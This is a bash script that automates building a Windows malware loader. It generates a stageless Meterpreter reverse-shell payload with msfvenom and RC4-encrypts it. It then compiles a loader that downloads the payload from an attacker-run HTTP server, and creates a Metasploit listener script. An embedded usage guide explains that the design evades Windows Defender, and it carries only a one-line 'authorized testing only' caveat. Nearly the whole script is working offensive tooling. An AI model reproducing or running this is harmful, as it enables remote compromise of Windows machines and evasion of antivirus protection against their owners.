#!/bin/bash
# Automated Stageless Loader Setup
# Generates payload, encrypts it, compiles loader, and sets up server/listener

set -e

echo "========================================"
echo "  Stageless Loader - Automated Setup"
echo "========================================"
echo ""

# Get user configuration
read -p "Enter your Kali IP (LHOST) [192.168.1.56]: " LHOST
LHOST=${LHOST:-192.168.1.56}

read -p "Enter listener port (LPORT) [4444]: " LPORT
LPORT=${LPORT:-4444}

read -p "Enter HTTP server port [8080]: " HTTP_PORT
HTTP_PORT=${HTTP_PORT:-8080}

echo ""
echo "[*] Configuration:"
echo "    LHOST: $LHOST"
echo "    LPORT: $LPORT"
echo "    HTTP Server: $LHOST:$HTTP_PORT"
echo ""

# Confirm
read -p "Continue with this configuration? (y/n): " CONFIRM
if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
    echo "[!] Setup cancelled."
    exit 1
fi

echo ""
echo "========================================"
echo "  Step 1: Generating MSFVenom Payload"
echo "========================================"

# Generate stageless meterpreter payload
msfvenom -p windows/x64/meterpreter_reverse_tcp \
    LHOST=$LHOST LPORT=$LPORT \
    -f raw -o reverse_shell.bin 2>/dev/null

PAYLOAD_SIZE=$(stat -c%s reverse_shell.bin)
echo "[+] Payload generated: reverse_shell.bin ($PAYLOAD_SIZE bytes)"

echo ""
echo "========================================"
echo "  Step 2: Encrypting Payload (RC4)"
echo "========================================"

# Encrypt payload
python3 encrypt_payload.py reverse_shell.bin payload.enc

echo ""
echo "========================================"
echo "  Step 3: Updating Loader Source"
echo "========================================"

# Extract RC4 key from payload_keys.h
RC4_KEY=$(grep "g_Rc4Key\[32\]" payload_keys.h | sed 's/.*= { \(.*\) };/\1/')

# Update stageless_loader.c with new key
sed -i "s/static BYTE g_Rc4Key\[32\] = { .* };/static BYTE g_Rc4Key[32] = { $RC4_KEY };/" stageless_loader.c

# Update download URL in loader
sed -i "s|char url\[\] = \".*\";|char url[] = \"http://$LHOST:$HTTP_PORT/payload.enc\";|" stageless_loader.c

echo "[+] Loader source updated with new key and URL"

echo ""
echo "========================================"
echo "  Step 4: Compiling Loader"
echo "========================================"

# Compile loader
x86_64-w64-mingw32-gcc -O2 -s stageless_loader.c -o stageless_loader.exe -lurlmon

LOADER_SIZE=$(stat -c%s stageless_loader.exe)
echo "[+] Loader compiled: stageless_loader.exe ($LOADER_SIZE bytes)"

echo ""
echo "========================================"
echo "  Step 5: Creating Server Script"
echo "========================================"

# Create HTTP server script
cat > start_server.sh << EOF
#!/bin/bash
# HTTP Server for Staged Payload Delivery
# Serves payload.enc on port $HTTP_PORT

echo "[*] Starting HTTP server on port $HTTP_PORT..."
echo "[*] Serving from: \$(pwd)"
echo "[*] Payload URL: http://$LHOST:$HTTP_PORT/payload.enc"
echo ""
echo "[+] Server is running. Press CTRL+C to stop."
echo ""

python3 -m http.server $HTTP_PORT
EOF

chmod +x start_server.sh
echo "[+] Created: start_server.sh"

echo ""
echo "========================================"
echo "  Step 6: Creating Listener Script"
echo "========================================"

# Create Metasploit listener script
cat > start_listener.sh << EOF
#!/bin/bash
# MSF Handler for Stageless Meterpreter
# Catches incoming Meterpreter shell from Windows target

echo "[*] Starting Metasploit handler..."
echo "[*] Listening on: $LHOST:$LPORT"
echo "[*] Payload: windows/x64/meterpreter_reverse_tcp (STAGELESS)"
echo ""

msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; set ExitOnSession false; exploit -j"
EOF

chmod +x start_listener.sh
echo "[+] Created: start_listener.sh"

echo ""
echo "========================================"
echo "  Step 7: Creating Usage Guide"
echo "========================================"

# Create usage instructions
cat > USAGE.md << EOF
# Stageless Loader - Usage Guide

## ✅ Setup Complete!

Your staged loader system is ready to use.

---

## 📋 Configuration

- **LHOST:** $LHOST
- **LPORT:** $LPORT
- **HTTP Server:** http://$LHOST:$HTTP_PORT

---

## 🚀 How to Use

### Step 1: Start HTTP Server
\`\`\`bash
./start_server.sh
\`\`\`

**Leave this running!** It serves the encrypted payload.

---

### Step 2: Start Metasploit Listener
\`\`\`bash
# Open new terminal
./start_listener.sh
\`\`\`

**Leave this running!** It catches the reverse shell.

---

### Step 3: Run on Windows Target

1. Copy \`stageless_loader.exe\` to Windows machine
2. Run it
3. Watch Metasploit console for:
   \`\`\`
   [*] Meterpreter session 1 opened
   \`\`\`

4. Interact with session:
   \`\`\`bash
   sessions -l
   sessions -i 1
   \`\`\`

---

## 🔧 Generate New Payload

To change IP/Port or regenerate:

\`\`\`bash
./setup.sh
\`\`\`

Follow the prompts to create a new loader with different configuration.

---

## 📁 Files

\`\`\`
stageless_loader.exe    <- Clean loader (NO MSFVenom inside!)
payload.enc          <- RC4-encrypted Meterpreter ($PAYLOAD_SIZE bytes)
start_server.sh      <- HTTP server script
start_listener.sh    <- Metasploit handler script
\`\`\`

---

## ✅ Why This Works

**Traditional Loader:**
- ❌ MSFVenom embedded in binary
- ❌ Defender detects instantly

**Stageless Loader:**
- ✅ NO MSFVenom in binary
- ✅ Defender scans → finds nothing
- ✅ Payload downloaded AFTER scan
- ✅ RC4 encryption protects payload

**Key:** Defender can't detect what isn't there yet!

---

## ⚠️ Important

- For **authorized testing only**
- Test on VM without Defender first
- HTTP is unencrypted (consider HTTPS for production)

---

**Generated:** $(date)
**Configuration:** $LHOST:$LPORT
EOF

echo "[+] Created: USAGE.md"

echo ""
echo "========================================"
echo "  ✅ SETUP COMPLETE!"
echo "========================================"
echo ""
echo "Generated files:"
echo "  - stageless_loader.exe ($LOADER_SIZE bytes)"
echo "  - payload.enc ($PAYLOAD_SIZE bytes)"
echo "  - start_server.sh"
echo "  - start_listener.sh"
echo "  - USAGE.md"
echo ""
echo "Next steps:"
echo "  1. ./start_server.sh    (in this terminal)"
echo "  2. ./start_listener.sh  (in new terminal)"
echo "  3. Run stageless_loader.exe on Windows target"
echo ""
echo "For detailed instructions, see: USAGE.md"
echo ""
